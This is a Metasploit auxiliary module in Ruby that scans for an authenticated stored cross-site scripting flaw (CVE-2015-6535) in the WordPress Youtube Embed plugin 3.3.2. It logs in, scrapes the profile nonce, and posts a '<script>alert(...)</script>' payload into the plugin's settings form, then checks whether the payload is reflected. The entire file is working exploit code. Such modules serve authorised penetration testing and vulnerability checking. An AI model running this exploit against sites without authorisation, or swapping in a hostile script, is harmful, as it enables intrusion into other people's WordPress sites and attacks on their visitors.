##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WordPress Youtube Embed XSS Scanner',
      'Description' => %q{
      This module attempts to exploit an Authenticated Cross-Site Scripting in Youtube Embed
      Plugin for WordPress, version 3.3.2 and likely prior in order if the
      instance is vulnerable.
      },
      'Author'      =>
        [
          'David Moore @grajagandev', # Vulnerability Discovery - Please PR your name here.
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2015-6535'],
          ['WPVDB', '8163'],
          ['URL', 'http://seclists.org/bugtraq/2015/Aug/146'],
          ['URL', 'https://packetstormsecurity.com/files/133340/']
        ],
      'DisclosureDate' => 'Ago 26 2015'
    ))

    register_options(
      [
        OptString.new('WP_USER', [true, 'A valid username', nil]),
        OptString.new('WP_PASS', [true, 'A valid password', nil])
      ], self.class)
  end

  def check
    check_plugin_version_from_readme('youtube-embed', '3.3.3')
  end

  def user
    datastore['WP_USER']
  end

  def password
    datastore['WP_PASS']
  end

  def get_nonce(cookie)
    res = send_request_cgi(
      'uri'    => normalize_uri(wordpress_url_backend, 'admin.php'),
      'method' => 'GET',
      'vars_get'  => {
        'page'    => 'profile-options'
      },
      'cookie' => cookie
    )

    if res && res.redirect? && res.redirection
      location = res.redirection
      print_status("#{peer} - Following redirect to #{location}")
      res = send_request_cgi(
        'uri'    => location,
        'method' => 'GET',
        'cookie' => cookie
      )
    end

    if res &&
        res.body &&
        res.body =~ /id="youtube_embed_profile_nonce" name="youtube_embed_profile_nonce" value="([a-z0-9]+)" /
      return Regexp.last_match[1]
    end
    nil
  end

  def run_host(ip)
    vprint_status("#{peer} - Trying to login as: #{user}")
    cookie = wordpress_login(user, password)
    if cookie.nil?
      print_error("#{peer} - Unable to login as: #{user}")
      return
    end

    vprint_status("#{peer} - Trying to get nonce...")
    nonce = get_nonce(cookie)
    if nonce.nil?
      print_error("#{peer} - Can not get nonce after login")
      return
    end
    vprint_status("#{peer} - Got nonce: #{nonce}")

    xss = Rex::Text.rand_text_numeric(8)

    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(wordpress_url_backend, 'admin.php'),
      'vars_get'  => {
        'page'    => 'profile-options'
      },
      'vars_post' => {
        'youtube_embed_profile_no'      => 1,
        'youtube_embed_name'            => "<script>alert(#{xss})</script>",
        'youtube_embed_type'            => 'v',
        'youtube_embed_playlist'        => 'v',
        'youtube_embed_template'        => '%video%',
        'youtube_embed_style'           => '',
        'youtube_embed_vq'              => '',
        'youtube_embed_download_text'   => 'Click+here+to+download+the+video',
        'youtube_embed_download_style'  => '',
        'youtube_embed_width'           => 560,
        'youtube_embed_height'          => 340,
        'youtube_embed_size'            => '',
        'youtube_embed_autohide'        => 2,
        'youtube_embed_controls'        => 1,
        'youtube_embed_info'            => 1,
        'youtube_embed_theme'           => 'dark',
        'youtube_embed_color'           => 'red',
        'youtube_embed_modest'          => 1,
        'youtube_embed_annotation'      => 1,
        'youtube_embed_link'            => 1,
        'youtube_embed_wmode'           => 'window',
        'youtube_embed_fallback'        => 'v',
        'youtube_embed_hd'              => 1,
        'youtube_embed_react'           => 1,
        'youtube_embed_sweetspot'       => 1,
        'youtube_embed_profile_nonce'   => "#{nonce}",
        '_wp_http_referer'              => '/wp-admin/admin.php?page=profile-options',
        'Submit'                        => 'Save+Settings'
      },
      'cookie'    => cookie
    )

    unless res && res.body
      print_error("#{peer} - Server did not respond in an expected way")
      return
    end

    if res.code == 200 && res.body.include?("#{xss}")
      print_good("#{peer} - Vulnerable to Cross-Site Scripting the Youtube Embed 3.3.2 plugin for WordPress")
      p = store_local(
        'wp_youtube_embed.http',
        'text/html',
        res.body,
        "#{xss}"
      )
      print_good("Save in: #{p}")
    else
      print_error("#{peer} - Failed, maybe the target isn't vulnerable.")
    end
  end
end
